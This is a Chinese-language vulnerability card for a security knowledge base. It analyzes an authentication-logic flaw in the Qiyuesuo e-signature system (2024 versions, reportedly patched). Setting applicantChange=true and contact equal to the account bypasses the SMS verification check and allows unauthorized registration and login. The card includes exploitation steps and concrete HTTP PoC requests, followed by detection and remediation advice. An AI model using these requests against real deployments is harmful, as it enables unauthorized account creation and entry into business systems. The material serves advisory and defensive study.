---
id: web-generic-auth-applicantchange-pin-sms-bypass-registration
title: 短信验证码接口 applicantChange 参数组合绕过存在性校验：任意手机号注册并登录电子签章后台
type: scenario
domain: web
path: web/generic/auth
technique: applicantchange-sms-pin-registration-bypass
tags:
- auth-bypass
- registration
- sms
- captcha
- java
- logic-flaw
- qiyuesuo
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 契约锁电子签章系统 2024 年各版本（厂商已发布补丁修复）
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:26:12+08:00'
  notes: 已对照原文与14张截图（01-09、12-16，10/11缺失）核对：Qvd12Filter 白名单/风险列表、AbstractAuthenticationFilter 中 isApplicantChange 条件 applicantChange && contact.equals(accountNo)（img/09）、/login/pin 中 !checkExist(username) && applicantChange==FALSE 才直接 SUCCESS、executeLogin 中 service 通过 checkServiceWhiteHost 后调用 executeApplicantChange（img/08）、executeApplicantChange 解析 service 的 corpName/userName/applicantChange/contact 并调用 addEmployee(userName, contact, corpName)/changeAuthPermission（img/04/06）、users 表新增 REGISTERED/PERSONAL 记录（img/12）、登录成功 token 与进入控制台（img/13/14）均一致。卡片按截图纠正了正文中 addEmployee 参数顺序不一致的问题。SPEL 部分两张截图响应为 code 100/5001003 未打通，作者已按简报跳过并在 cards.json 记录，卡片未纳入，处理正确。产品为契约锁电子签章系统 2024 年各版本（已修复），卡片 affected_versions 已标注。未在本机复现。
url: /docs/web/generic/auth/web-generic-auth-applicantchange-pin-sms-bypass-registration/
draft: false
kb_aliases:
- 契约锁验证码绕过
- applicantChange 任意用户注册
- needCaptcha=false 短信绕过
- /login/pin 验证码绕过
- 电子签章系统任意注册
---

## 一句话结论

契约锁电子签章系统的 `/login/pin` 在 `applicantChange=true` 时，把 `contact` 与 `username` 一起传给 `isApplicantChange(contact, isChanged, accountNo)`；该方法只在 `applicantChange && contact.equals(accountNo)` 时返回 `EXIST`/`NOT_EXIST`，否则返回 `FALSE`。攻击者令 `contact` 等于 `username`（由加密参数解出的账号）即可绕过“手机号必须已存在”的发送条件，向任意可接收短信的号码发送验证码；再在 `/login` 登录流程中携带同一组 `applicantChange/contact/service` 参数，使 `executeApplicantChange` 调用 `addEmployee`/`changeAuthPermission`，从而用未注册手机号完成账号创建并登录后台。

## 原理

- 发送验证码接口 `/login/pin` 的判定链：`encrypt` 经 RSA 解密得到 `username`（账号/手机号）；读取 `applicantChange` 布尔值；当其为 true 时调用 `applicantChangeService.isApplicantChange(contact, isApplicantChange, username)`。
- `isApplicantChange` 的实现是 `if (applicantChange && contact.equals(accountNo)) { return isExist(contact) ? EXIST : NOT_EXIST; } else { return FALSE; }`。也就是说，只有“参数为 true 且 contact 与账号相同”才进入业务判断；否则返回 `FALSE`。
- `/login/pin` 中只有 `!checkExist(username) && applicantChange == FALSE` 才直接返回 SUCCESS（视为无需短信的路径）。由于 `FALSE` 只在 contact 与账号不相等时出现，攻击者让两者相等，即可让 `applicantChange` 变成 `EXIST`/`NOT_EXIST`，既不触发“直接成功”，也绕过了“手机号不存在就不发短信”的校验——验证码被发送到攻击者可控号码。
- 注册/登录耦合：登录成功后 `AbstractAuthenticationFilter.executeLogin` 在 `validateServiceUrl(service)` 通过时调用 `executeApplicantChange(service, request.getParameter("username"))`；后者从 `service` 查询串解析 `corpName/userName/applicantChange/contact`，再次调用 `isApplicantChange`；只要结果不是 `FALSE`，就执行 `addEmployee(userName, contact, corpName)` 和 `changeAuthPermission(corpName, userName, contact)`。
- 参数来源：`accountNo` 就是登录请求的 `username`（与 `/login/pin` 的 RSA 解密结果对应）；`corpName/userName/contact/applicantChange` 全部来自 `service` 参数里的 query string，而 `service` 只需通过服务端白名单主机校验（同源地址通常即可满足）。
- 根因是“安全判断依赖可被客户端同时控制的两个字段相等”，且验证码发送条件、注册条件、登录条件分属不同代码路径，组合后互相抵消：客户端可令 `contact=username`、`applicantChange=true`，同时让 `needCaptcha=false` 绕过图形验证码。
- 危害边界：该链路创建的是平台个人用户（基础权限），但完全未授权、可用任意手机号，且是后续 SPEL 等更高危漏洞的入口；本卡只覆盖验证码/注册绕过，不把未验证的 SPEL 链写成同一 PoC。

## 触发条件

- 目标为存在该逻辑的契约锁电子签章系统 2024 年版本（官方已修复，当前版本不受影响）。
- 能访问登录端口（文章环境为 9180，产品默认端口可能不同）与 `/login/pin`、`/login`。
- `/login/pin` 接受客户端传入 `needCaptcha=false`、`applicantChange=true`、`contact`，且 `encrypt` 可被攻击者生成（前端使用应用内置公钥加密，私钥在服务端解密；拿到前端公钥即可构造任意 username 的密文）。
- 攻击者拥有一个可接收短信的手机号（号码即账号）；`contact` 与解密后的 `username` 必须完全一致。
- 登录时 `service` 参数需通过 `checkServiceWhiteHost`/`validateServiceUrl`，通常使用目标自身域名/IP 即可。

## 利用步骤

1. 获取前端 RSA 公钥（登录页 JS），或直接复用登录请求中的 `encrypt` 生成方式，把目标手机号加密成 `encrypt`。
2. 发送验证码：`GET /login/pin?needCaptcha=false&applicantChange=true&contact=<手机号>&encrypt=<加密后的同一手机号>`；因 `contact == username`，`isApplicantChange` 返回 NOT_EXIST 而非 FALSE，短信发出。
3. 用收到的 `pin` 调用 `/login`：`username=<手机号>&pin=<验证码>&service=<同源 URL，query 带 corpName/username/userName/applicantChange=true/contact>`。
4. 登录成功（响应 `code:0` 与 token）；若走 `service` 分支，`executeApplicantChange` 会调用 `addEmployee` 把该手机号用户加入对应企业并调整权限。
5. 验证：登录 Web 控制台可见新账号；数据库 `users` 表出现 `mobile={cipher}...`、`status=REGISTERED`、`tenantType=PERSONAL` 的新记录。
6. 后续可携带 token 调用业务接口；文章中随后使用模板接口的 SPEL 注入尝试提权，但该部分证据不完整，本卡不纳入。

## PoC

```http
### 1. 发送短信验证码（contact 与 encrypt 解出的 username 相同）
GET /login/pin?_=1725114728175&encrypt=<RSA(手机号)>&needCaptcha=false&captcha=&applicantChange=true&contact=15******* HTTP/1.1
Host: target:9180

### 2. 用收到的 pin 注册/登录；service 指向同源并携带 applicantChange 相关参数
POST /login?_=1725344336250 HTTP/1.1
Host: target:9180
Content-Type: application/x-www-form-urlencoded

username=15*******&pin=224653&service=http%3A%2F%2Ftarget%3A9180%2Fuser%2Fadd%3FcorpName%3D15*******%26username%3D15*******%26userName%3D1%26applicantChange%3Dtrue%26contact%3D15*******
```

```text
文章实验记录：
- /login/pin 返回成功，短信到达攻击者手机；
- /login 返回 {"code":0,"message":"登录成功","token":"..."}；
- 数据库 users 表新增 mobile={cipher}...、status=REGISTERED、tenantType=PERSONAL 的记录；
- 浏览器以该账号登录进入电子签章控制台。
- 文章另一张截图中的成功登录请求 service 仅为 "/"（账号已创建后的普通登录），说明 service 参数在账号创建后非必需；创建账号的关键仍是第 2 步的 applicantChange/contact 组合。
PoC 未在本机执行，结果来自文章截图。
```

## 变体与关联

- 变体（发送条件绕过）：不提交 `applicantChange` 时走 `else if (!checkExist(username))` 分支；提交 `applicantChange=true` 且 `contact==username` 则进入 `EXIST/NOT_EXIST` 分支，两种分支的存在性判断不一致，是逻辑漏洞的核心。
- 变体（注册分支）：`service` 指向 `/user/add` 并携带 `corpName/username/userName/contact` 时走 `executeApplicantChange → addEmployee + changeAuthPermission`；若目标不校验 service 主机，还可把 `service` 指向任意同白名单域。
- 关联：同层“客户端可控参数决定认证结果”的逻辑缺陷卡（如 2FA 参数篡改、用户名枚举、缺失函数级校验）可对照；本卡的独特之处是 `contact=username` 使两个独立校验同时失效。
- 边界：产品已修复；`encrypt` 必须能被攻击者按服务端私钥对应的公钥生成；`contact` 与实际账号不一致时 `isApplicantChange` 返回 FALSE，链路退化；若目标未部署短信服务或号码被风控，验证码无法到达。

## 检测与防御

- 请求检测：`/login/pin` 同时出现 `needCaptcha=false`、`applicantChange=true` 且 `contact` 与 `encrypt` 解出的账号一致；同一 IP/设备短时间对多个不同手机号请求 `pin`；`/login` 的 `service` 参数含 `user/add`、`applicantChange=true`、`contact`、`corpName` 等内部参数。
- 业务检测：新注册账号与申请人/企业邀请无关联；`users` 表短时间出现大量 `tenantType=PERSONAL`、`status=REGISTERED` 且无企业归属的记录；`addEmployee` 调用日志中新员工与 corpName 不匹配。
- 修复：验证码发送条件必须服务端强校验（手机号是否已注册、是否属于当前申请人），不得由 `applicantChange`、`needCaptcha`、`contact` 等客户端参数决定；`contact` 必须与登录账号唯一绑定，禁止客户端同时控制两者。
- 修复：注册流程与登录流程解耦，`service` 参数只允许固定枚举值，不允许携带任意业务参数；`executeApplicantChange` 中的 `addEmployee/changeAuthPermission` 必须校验调用者身份与目标企业关系。
- 加固：图形验证码不可由客户端关闭；对短信接口做手机号+IP+设备限频；监控异常注册与登录成功但无历史行为的新账号；上线前对“同一请求中多个安全判断字段可同时由客户端控制”的代码路径做威胁建模。
